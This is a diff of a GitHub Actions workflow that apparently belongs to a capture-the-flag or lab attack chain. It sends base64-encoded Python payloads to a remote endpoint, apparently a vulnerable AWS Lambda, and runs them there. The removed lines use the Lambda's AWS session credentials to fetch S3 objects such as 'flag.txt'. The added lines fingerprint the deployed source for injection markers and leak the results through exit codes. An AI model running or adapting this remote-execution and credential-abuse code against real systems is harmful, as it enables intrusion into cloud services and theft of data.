@@ -1,4 +1,4 @@
-name: Stage2-06-S3-Get-Test
+name: Stage2-01-Source-Fingerprint
 
 on:
   push:
@@ -9,7 +9,7 @@ permissions:
   contents: read
 
 jobs:
-  probe:
+  fingerprint:
     runs-on: ubuntu-latest
 
     env:
@@ -23,7 +23,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test S3 GET from Lambda
+      - name: Fingerprint deployed Lambda source
         run: |
           python3 - <<'PY'
           import os
@@ -39,58 +39,64 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          tests = [
-              ("userad88e2b168aa387e", "flag.txt"),
-              ("userad88e2b168aa387e", "index.html"),
-              ("userad88e2b168aa387e", "docs.html"),
-              ("logad88e2b168aa387e", "flag.txt")
-          ]
-
-          for bucket, key in tests:
-              code = f'''
-          import os
+          tests = {
+              "source_readable": r'''
           import subprocess
 
-          url = "https://s3.us-east-1.amazonaws.com/{bucket}/{key}"
+          result = subprocess.run(
+              ["/bin/sh", "-c", "test -r /var/task/lambda_function.py"]
+          )
 
-          command = [
-              "curl",
-              "--silent",
-              "--show-error",
-              "--output",
-              "/tmp/object_result",
-              "--write-out",
-              "%{{http_code}}",
-              "--aws-sigv4",
-              "aws:amz:us-east-1:s3",
-              "--user",
-              os.environ["AWS_ACCESS_KEY_ID"] + ":" + os.environ["AWS_SECRET_ACCESS_KEY"],
-              "-H",
-              "x-amz-security-token: " + os.environ["AWS_SESSION_TOKEN"],
-              url
-          ]
+          raise SystemExit(7 if result.returncode == 0 else 9)
+          ''',
+
+              "source_size": r'''
+          import subprocess
 
           result = subprocess.run(
-              command,
+              ["/bin/sh", "-c", "wc -c < /var/task/lambda_function.py"],
               stdout=subprocess.PIPE,
               stderr=subprocess.PIPE,
               text=True
           )
 
-          status = result.stdout.strip()
+          try:
+              size = int(result.stdout.strip())
+              raise SystemExit(20 + min(size, 220))
+          except SystemExit:
+              raise
+          except Exception:
+              raise SystemExit(19)
+          ''',
 
-          if status.startswith("2"):
-              raise SystemExit(7)
+              "historical_markers": r'''
+          import subprocess
 
-          if status == "403":
-              raise SystemExit(10)
+          command = (
+              "grep -a -E -o "
+              "'subprocess|shell=True|nslookup|lambda_handler|"
+              "domain[[:space:]]*=[[:space:]]*event' "
+              "/var/task/lambda_function.py | sort -u | wc -l"
+          )
 
-          if status == "404":
-              raise SystemExit(12)
+          result = subprocess.run(
+              ["/bin/sh", "-c", command],
+              stdout=subprocess.PIPE,
+              stderr=subprocess.PIPE,
+              text=True
+          )
 
-          raise SystemExit(19)
+          try:
+              count = int(result.stdout.strip())
+              raise SystemExit(30 + min(count, 20))
+          except SystemExit:
+              raise
+          except Exception:
+              raise SystemExit(19)
           '''
+          }
 
+          for name, code in tests.items():
               encoded = base64.b64encode(code.encode()).decode()
 
               response = requests.post(
@@ -100,7 +106,7 @@ jobs:
                   timeout=40
               )
 
-              print(f"BUCKET={bucket} KEY={key}")
+              print(f"TEST={name}")
               print(response.text)
               print("---")
           PY
